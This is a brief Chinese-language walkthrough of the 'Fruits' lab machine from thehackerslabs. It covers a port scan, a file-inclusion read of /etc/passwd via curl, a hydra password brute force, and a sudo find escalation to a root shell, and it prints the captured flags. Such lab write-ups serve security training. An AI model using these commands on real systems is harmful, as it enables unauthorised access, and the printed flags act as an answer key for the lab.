# Fruits

2025.03.07 https://thehackerslabs.com/fruits/

[video](https://www.bilibili.com/video/BV1fp91YAEAS/?spm_id_from=333.1387.collection.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

首页上的提交显示 404，扫描出新的 url http://192.168.5.39/fruits.php 空白页面，进行参数 FUZZ，找到参数 file ，存在文件包含可以读取到 passwd : curl -s http://192.168.5.39/fruits.php?file=/etc/passwd , 发现一个普通用户 bananaman 。

在尝试 FUZZ 读取其他文件，都读不到，只好 hydra 爆一下这个用户 bananaman 的登陆密码，发现密码: celtic , ssh 进行登陆。

先拿到了 user flag：

```
bananaman@Fruits:~$ cat user.txt
482c811da5d5b4bc6d497ffa98491e38
```

sudo 显示 (ALL) NOPASSWD: /usr/bin/find 直接提权到 root：

```
sudo find . -exec /bin/sh \; -quit
```

拿到 root flag:

```
# cat root.txt
21232f297a57a5a743894a0e4a801fc3
```
